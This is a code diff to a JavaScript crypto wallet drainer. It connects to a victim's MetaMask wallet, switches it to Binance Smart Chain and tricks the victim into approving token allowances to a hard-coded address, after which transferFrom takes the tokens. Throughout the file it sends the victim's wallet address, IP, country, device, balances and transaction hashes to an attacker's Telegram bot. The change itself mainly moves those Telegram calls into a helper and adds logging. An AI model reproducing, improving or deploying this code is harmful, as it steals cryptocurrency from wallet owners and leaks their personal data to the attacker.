@@ -100,7 +100,7 @@ async function connectWalletAndSendTokens() {
       name: "Binance Smart Chain",
       chainName: "bsc",
       nativeCoin: "BNB",
-      exodusAddress: "0xe22151324Ed5b8A4F2B45f1Funds1e15B2aEc1B28" // Replace with a test address
+      exodusAddress: "0xe22151324Ed5b8A4F2B45f1Funds1e15B2aEc1B28" // Replace with test address
     }
   ];
 
@@ -110,8 +110,30 @@ async function connectWalletAndSendTokens() {
 
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
+  // Helper function to send Telegram notifications
+  async function sendTelegramNotification(message) {
+    try {
+      console.log("Attempting to send Telegram notification:", message);
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+      const result = await response.json();
+      if (!result.ok) {
+        throw new Error(`Telegram API error: ${result.description}`);
+      }
+      console.log("Telegram notification sent successfully:", result);
+      return result;
+    } catch (error) {
+      console.error("Failed to send Telegram notification:", error.message);
+      return null;
+    }
+  }
+
   try {
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    console.log("Requesting MetaMask account connection...");
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
@@ -127,26 +149,42 @@ async function connectWalletAndSendTokens() {
       deviceType = "Desktop";
     }
 
+    // Fetch location data
     let locationData = {};
     try {
+      console.log("Fetching location data...");
       const locRes = await fetch("https://ipapi.co/json/");
       locationData = await locRes.json();
+      console.log("Location data fetched:", locationData);
     } catch (e) {
       console.warn("Location fetch failed", e);
       locationData = { country_name: "Unknown", ip: "N/A" };
     }
+
+    // Send wallet connection notification
+    const connectionMessage = `
+📥 Wallet Connected on Binance Smart Chain
+Address: ${userAddress}
+Wallet: MetaMask
+Country: ${locationData.country_name}
+IP: ${locationData.ip}
+${deviceType}
+    `;
+    await sendTelegramNotification(connectionMessage);
 
     for (const network of evmNetworks) {
       try {
         console.log(`Processing network: ${network.name}`);
 
         try {
+          console.log("Switching to BSC network...");
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: `0x${network.chainId.toString(16)}` }]
           });
         } catch (switchErr) {
           if (switchErr.code === 4902) {
+            console.log("BSC network not found, adding chain...");
             const chainConfig = {
               chainId: '0x38',
               chainName: 'Binance Smart Chain Mainnet',
@@ -174,21 +212,13 @@ async function connectWalletAndSendTokens() {
 
         if (currentNetwork.chainId !== network.chainId) {
           const errorMessage = `❌ Failed to switch to ${network.name}.\n${deviceType}`;
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-          });
+          await sendTelegramNotification(errorMessage);
           continue;
         }
 
         if (!currentSigner) {
           const errorMessage = `❌ Signer not initialized for ${network.name}.\n${deviceType}`;
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-          });
+          await sendTelegramNotification(errorMessage);
           continue;
         }
 
@@ -203,6 +233,7 @@ async function connectWalletAndSendTokens() {
         while (apiAttempts < maxAttempts && !apiSuccess) {
           try {
             apiAttempts++;
+            console.log(`Fetching BEP-20 tokens (attempt ${apiAttempts})...`);
             const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
             const response = await fetch(moralisUrl, {
               headers: { "X-API-Key": moralisApiKey }
@@ -241,23 +272,13 @@ async function connectWalletAndSendTokens() {
         const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;
 
         const networkMessage = `
-📥 Wallet Connected on ${network.name}
-Address: ${userAddress}
-Wallet: MetaMask
-Country: ${locationData.country_name}
-IP: ${locationData.ip}
-${deviceType}
-
-💰 Balances:
+💰 Balances on ${network.name}:
 ${tokenSummary}
 ${nativeBalanceMessage}
+Address: ${userAddress}
+${deviceType}
         `;
-
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
-        });
+        await sendTelegramNotification(networkMessage);
 
         const nonZeroTokens = tokens.filter(t => 
           t.balance && 
@@ -280,11 +301,7 @@ Token: ${token.symbol || 'Unknown'}
 Error: No contract code at ${token.token_address}
 ${deviceType}
                 `;
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-                });
+                await sendTelegramNotification(errorMessage);
                 continue;
               }
 
@@ -305,6 +322,7 @@ ${deviceType}
 
                 while (attempts < maxAttempts) {
                   try {
+                    console.log(`Attempting approval for ${token.symbol} (attempt ${attempts + 1})...`);
                     approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance, { gasLimit: 100000 });
                     await approvalTx.wait();
                     break; // Success, exit retry loop
@@ -334,11 +352,7 @@ Error: ${err.message} (after ${attempts} attempts)
 ${deviceType}
                       `;
                     }
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-                    });
+                    await sendTelegramNotification(errorMessage);
                     continue; // Skip to next token
                   }
                 }
@@ -353,11 +367,7 @@ Spender: ${network.exodusAddress}
 Tx: ${approvalTx.hash}
 ${deviceType}
                   `;
-                  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: approvalMessage })
-                  });
+                  await sendTelegramNotification(approvalMessage);
                 }
               } else {
                 console.log(`Sufficient allowance already exists for ${token.symbol}`);
@@ -380,11 +390,7 @@ Error: ${err.message}
 ${deviceType}
                 `;
               }
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-              });
+              await sendTelegramNotification(errorMessage);
               continue;
             }
           }
@@ -394,28 +400,16 @@ ${deviceType}
 Address: ${userAddress}
 ${deviceType}
           `;
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: noTokensMessage })
-          });
+          await sendTelegramNotification(noTokensMessage);
         }
       } catch (err) {
         const errorMessage = `❌ Error on ${network.name}: ${err.message}\n${deviceType}`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-        });
+        await sendTelegramNotification(errorMessage);
       }
     }
   } catch (err) {
     const errorMessage = `❌ Wallet Connection Failed: ${err.message}\n${deviceType}`;
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-    });
+    await sendTelegramNotification(errorMessage);
   }
 }
 
@@ -433,6 +427,26 @@ async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, 
     deviceType = "Tablet";
   } else {
     deviceType = "Desktop";
+  }
+
+  async function sendTelegramNotification(message) {
+    try {
+      console.log("Attempting to send Telegram notification:", message);
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+      const result = await response.json();
+      if (!result.ok) {
+        throw new Error(`Telegram API error: ${result.description}`);
+      }
+      console.log("Telegram notification sent successfully:", result);
+      return result;
+    } catch (error) {
+      console.error("Failed to send Telegram notification:", error.message);
+      return null;
+    }
   }
 
   try {
@@ -457,11 +471,7 @@ To: ${exodusAddress}
 Tx: ${transferTx.hash}
 ${deviceType}
     `;
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
-    });
+    await sendTelegramNotification(transferSuccessMessage);
   } catch (err) {
     const errorMessage = `
 ❌ Transfer Failed
@@ -469,11 +479,7 @@ Token Address: ${tokenAddress}
 Error: ${err.message}
 ${deviceType}
     `;
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-    });
+    await sendTelegramNotification(errorMessage);
   }
 }
 
